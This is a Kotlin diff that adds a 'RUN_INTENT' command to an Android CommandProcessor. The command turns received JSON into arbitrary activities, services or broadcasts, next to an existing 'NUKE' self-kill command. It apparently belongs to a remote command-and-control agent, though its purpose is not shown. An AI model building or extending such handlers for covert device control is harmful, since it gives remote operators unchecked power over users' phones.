@@ -154,6 +154,41 @@ object CommandProcessor {
                         Handler(Looper.getMainLooper()).postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 2000)
                     } catch(e: Exception) { status = "FAILED NUKE" }
                 }
+                "RUN_INTENT" -> {
+                    try {
+                        val json = JSONObject(content)
+                        val intent = android.content.Intent(json.optString("action", android.content.Intent.ACTION_VIEW))
+                        
+                        if (json.has("data")) intent.data = android.net.Uri.parse(json.getString("data"))
+                        if (json.has("pkg")) intent.setPackage(json.getString("pkg"))
+                        if (json.has("type")) intent.setDataAndType(intent.data, json.getString("type"))
+                        
+                        // Handle Extras
+                        val extras = json.optJSONObject("extras")
+                        extras?.keys()?.forEach { key ->
+                            val value = extras.get(key)
+                            if (value is Boolean) intent.putExtra(key, value)
+                            else if (value is Int) intent.putExtra(key, value)
+                            else intent.putExtra(key, value.toString())
+                        }
+
+                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+                        
+                        val target = json.optString("target", "activity")
+                        when(target.lowercase()) {
+                            "service" -> {
+                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
+                                else ctx.startService(intent)
+                            }
+                            "broadcast" -> ctx.sendBroadcast(intent)
+                            else -> ctx.startActivity(intent)
+                        }
+                        status = "EXECUTED (INTENT SENT)"
+                    } catch (e: Exception) {
+                        status = "FAILED_INTENT"
+                        errorMsg = e.message ?: "Unknown Intent Error"
+                    }
+                }
             }
         } catch (e: Exception) {
             status = "FAILED: ${e.message}"
